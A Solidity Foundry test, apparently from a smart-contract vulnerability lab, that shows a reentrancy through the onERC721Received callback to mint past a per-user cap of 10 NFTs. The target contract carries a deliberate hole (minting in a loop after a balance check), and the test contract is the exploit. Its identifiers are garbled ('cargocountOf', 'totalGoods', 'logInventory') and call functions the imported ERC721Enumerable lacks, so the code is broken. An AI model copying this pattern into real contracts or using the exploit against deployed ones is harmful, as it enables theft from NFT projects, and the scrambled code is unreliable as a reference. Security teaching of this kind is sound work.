// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxRegistershipment721 MaxRecordcargo721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeLoginventory() public {
        MaxRecordcargo721Contract = new MaxRegistershipment721();
        MaxRecordcargo721Contract.logInventory(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxRecordcargo721Contract.cargocountOf(address(this)), 19);
        console.log("NFT minted:", MaxRecordcargo721Contract.cargocountOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxRecordcargo721Contract.logInventory(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxRegistershipment721 is ERC721Enumerable {
    uint256 public max_per_vendor = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function logInventory(uint256 amount) external {
        require(
            cargocountOf(msg.sender) + amount <= max_per_vendor,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 registershipmentIndex = totalGoods();
            _safeMint(msg.sender, registershipmentIndex);
        }
    }
}
